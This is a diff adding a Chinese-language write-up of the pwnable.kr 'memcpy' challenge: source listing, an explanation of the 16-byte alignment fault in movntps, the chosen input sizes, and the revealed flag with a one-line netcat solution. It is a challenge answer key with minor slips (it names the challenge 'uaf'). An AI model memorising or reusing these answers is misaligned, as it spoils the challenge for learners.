@@ -10912,3 +10912,267 @@ io.interactive()
 
 ------
 
+### memcpy
+
+这是**Pwnable.kr**的第十七个挑战`uaf`，来自**[Toddler's Bottle]**部分。
+
+```bash
+Are you tired of hacking?, take some rest here.
+Just help me out with my small experiment regarding memcpy performance. 
+after that, flag is yours.
+
+http://pwnable.kr/bin/memcpy.c
+
+ssh memcpy@pwnable.kr -p2222 (pw:guest)
+```
+
+首先通过`ssh`远程连接目标主机。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ ssh memcpy@pwnable.kr -p2222
+memcpy@pwnable.kr's password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87@khu.ac.kr
+- irc.netgarage.org:6667 / #pwnable.kr
+- Simply type "irssi" command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+You have mail.
+Last login: Fri Jun  9 13:49:58 2023 from 147.235.209.41
+```
+
+然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。
+
+```bash
+memcpy@pwnable:~$ ls -la
+total 28
+drwxr-x---   5 root memcpy 4096 Oct 23  2016 .
+drwxr-xr-x 117 root root   4096 Nov 10  2022 ..
+d---------   2 root root   4096 Mar  4  2016 .bash_history
+dr-xr-xr-x   2 root root   4096 Jul 13  2016 .irssi
+-rw-r--r--   1 root root   3172 Mar  4  2016 memcpy.c
+drwxr-xr-x   2 root root   4096 Oct 23  2016 .pwntools-cache
+-rw-r--r--   1 root root    192 Mar 10  2016 readme
+```
+
+用户`memcpy`拥有权限的文件只有两个：`memcpy.c`和`readme`。
+
+```bash
+memcpy@pwnable:~$ cat readme
+the compiled binary of "memcpy.c" source code (with real flag) will be executed under memcpy_pwn privilege if you connect to port 9022.
+execute the binary by connecting to daemon(nc 0 9022).
+```
+
+如果`nc`连接到`9022`端口，则`memcpy.c`源代码编译的二进制文件（含有flag）将在`memcpy_pwn`权限下执行。看下`memcpy.c`的源代码：
+
+```c
+memcpy@pwnable:~$ cat memcpy.c
+// compiled with : gcc -o memcpy memcpy.c -m32 -lm
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include <math.h>
+
+unsigned long long rdtsc(){
+    asm("rdtsc");
+}
+
+char* slow_memcpy(char* dest, const char* src, size_t len){
+    int i;
+    for (i=0; i<len; i++) {
+        dest[i] = src[i];
+    }
+    return dest;
+}
+
+char* fast_memcpy(char* dest, const char* src, size_t len){
+    size_t i;
+    // 64-byte block fast copy
+    if(len >= 64){
+        i = len / 64;
+        len &= (64-1);
+        while(i-- > 0){
+            __asm__ __volatile__ (
+            "movdqa (%0), %%xmm0\n"
+            "movdqa 16(%0), %%xmm1\n"
+            "movdqa 32(%0), %%xmm2\n"
+            "movdqa 48(%0), %%xmm3\n"
+            "movntps %%xmm0, (%1)\n"
+            "movntps %%xmm1, 16(%1)\n"
+            "movntps %%xmm2, 32(%1)\n"
+            "movntps %%xmm3, 48(%1)\n"
+            ::"r"(src),"r"(dest):"memory");
+            dest += 64;
+            src += 64;
+        }
+    }
+    // byte-to-byte slow copy
+    if(len) slow_memcpy(dest, src, len);
+    return dest;
+}
+
+int main(void){
+
+    setvbuf(stdout, 0, _IONBF, 0);
+    setvbuf(stdin, 0, _IOLBF, 0);
+
+    printf("Hey, I have a boring assignment for CS class.. :(\n");
+    printf("The assignment is simple.\n");
+
+    printf("-----------------------------------------------------\n");
+    printf("- What is the best implementation of memcpy?        -\n");
+    printf("- 1. implement your own slow/fast version of memcpy -\n");
+    printf("- 2. compare them with various size of data         -\n");
+    printf("- 3. conclude your experiment and submit report     -\n");
+    printf("-----------------------------------------------------\n");
+
+    printf("This time, just help me out with my experiment and get flag\n");
+    printf("No fancy hacking, I promise :D\n");
+
+    unsigned long long t1, t2;
+    int e;
+    char* src;
+    char* dest;
+    unsigned int low, high;
+    unsigned int size;
+    // allocate memory
+    char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+    src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
+
+    size_t sizes[10];
+    int i=0;
+
+    // setup experiment parameters
+    for(e=4; e<14; e++){    // 2^13 = 8K
+        low = pow(2,e-1);
+        high = pow(2,e);
+        printf("specify the memcpy amount between %d ~ %d : ", low, high);
+        scanf("%d", &size);
+        if( size < low || size > high ){
+                printf("don't mess with the experiment.\n");
+                exit(0);
+        }
+        sizes[i++] = size;
+    }
+
+    sleep(1);
+    printf("ok, lets run the experiment with your configuration\n");
+    sleep(1);
+
+    // run experiment
+    for(i=0; i<10; i++){
+        size = sizes[i];
+        printf("experiment %d : memcpy with buffer size %d\n", i+1, size);
+        dest = malloc( size );
+
+        memcpy(cache1, cache2, 0x4000);         // to eliminate cache effect
+        t1 = rdtsc();
+        slow_memcpy(dest, src, size);           // byte-to-byte memcpy
+        t2 = rdtsc();
+        printf("ellapsed CPU cycles for slow_memcpy : %llu\n", t2-t1);
+
+        memcpy(cache1, cache2, 0x4000);         // to eliminate cache effect
+        t1 = rdtsc();
+        fast_memcpy(dest, src, size);           // block-to-block memcpy
+        t2 = rdtsc();
+        printf("ellapsed CPU cycles for fast_memcpy : %llu\n", t2-t1);
+        printf("\n");
+    }
+
+    printf("thanks for helping my experiment!\n");
+    printf("flag : ----- erased in this source code -----\n");
+    return 0;
+}
+```
+
+在用户根据提示输入`10`个数字分配内存后，该程序会使用`malloc()`函数为每个输入的数据在堆上申请堆块，然后以`memcpy()`为中介计算，比较`slow_memcpy()`和`fast_memcpy()`这两个函数耗费的时间。其中，`slow_memcpy()` 使用的是循环赋值，`fast_memcpy()` 使用的是汇编指令 `movdqa` 和 `movntps` 进行复制。程序会在所有数字拷贝成功后输出`flag`。
+
+`nc 0 9022`简单测试了一下发现遇到了错误，出现的错误是由于`fast_memcpy()`函数中的`moventps`引起的。`moventps`要求操作数按 `16` 字节对齐。但是，参数`dest`的地址可能未对齐到 `16` 字节，这具体取决于用户输入的大小。`C` 语言中的 `malloc(n)` 实际分配的堆内存是 `Header(4 字节) + n` 结构，即分配 `n + 4` 字节的空间，返回给用户的是 `n` 部分的首地址。我们只需要找出`10`个符合输入范围且可以做到`16`字节对齐的数字即可得到`flag`：`1_w4nn4_br34K_th3_m3m0ry_4lignm3nt`。
+
+```bash
+memcpy@pwnable:~$ nc 0 9022
+Hey, I have a boring assignment for CS class.. :(
+The assignment is simple.
+-----------------------------------------------------
+- What is the best implementation of memcpy?        -
+- 1. implement your own slow/fast version of memcpy -
+- 2. compare them with various size of data         -
+- 3. conclude your experiment and submit report     -
+-----------------------------------------------------
+This time, just help me out with my experiment and get flag
+No fancy hacking, I promise :D
+specify the memcpy amount between 8 ~ 16 : 12
+specify the memcpy amount between 16 ~ 32 : 28
+specify the memcpy amount between 32 ~ 64 : 60
+specify the memcpy amount between 64 ~ 128 : 124
+specify the memcpy amount between 128 ~ 256 : 252
+specify the memcpy amount between 256 ~ 512 : 508
+specify the memcpy amount between 512 ~ 1024 : 1020
+specify the memcpy amount between 1024 ~ 2048 : 2044
+specify the memcpy amount between 2048 ~ 4096 : 4092
+specify the memcpy amount between 4096 ~ 8192 : 8188
+ok, lets run the experiment with your configuration
+experiment 1 : memcpy with buffer size 12
+ellapsed CPU cycles for slow_memcpy : 5268
+ellapsed CPU cycles for fast_memcpy : 576
+
+experiment 2 : memcpy with buffer size 28
+ellapsed CPU cycles for slow_memcpy : 634
+ellapsed CPU cycles for fast_memcpy : 420
+
+experiment 3 : memcpy with buffer size 60
+ellapsed CPU cycles for slow_memcpy : 1010
+ellapsed CPU cycles for fast_memcpy : 994
+
+experiment 4 : memcpy with buffer size 124
+ellapsed CPU cycles for slow_memcpy : 1782
+ellapsed CPU cycles for fast_memcpy : 1070
+
+experiment 5 : memcpy with buffer size 252
+ellapsed CPU cycles for slow_memcpy : 3648
+ellapsed CPU cycles for fast_memcpy : 1064
+
+experiment 6 : memcpy with buffer size 508
+ellapsed CPU cycles for slow_memcpy : 6628
+ellapsed CPU cycles for fast_memcpy : 1218
+
+experiment 7 : memcpy with buffer size 1020
+ellapsed CPU cycles for slow_memcpy : 13552
+ellapsed CPU cycles for fast_memcpy : 1386
+
+experiment 8 : memcpy with buffer size 2044
+ellapsed CPU cycles for slow_memcpy : 25978
+ellapsed CPU cycles for fast_memcpy : 2078
+
+experiment 9 : memcpy with buffer size 4092
+ellapsed CPU cycles for slow_memcpy : 52416
+ellapsed CPU cycles for fast_memcpy : 2830
+
+experiment 10 : memcpy with buffer size 8188
+ellapsed CPU cycles for slow_memcpy : 116424
+ellapsed CPU cycles for fast_memcpy : 4690
+
+thanks for helping my experiment!
+flag : 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt
+```
+
+简洁的一行：
+
+```bash
+memcpy@pwnable:~$ echo "12 28 60 124 252 508 1020 2044 4092 8188" | nc 0 9022
+```
+
+------
+
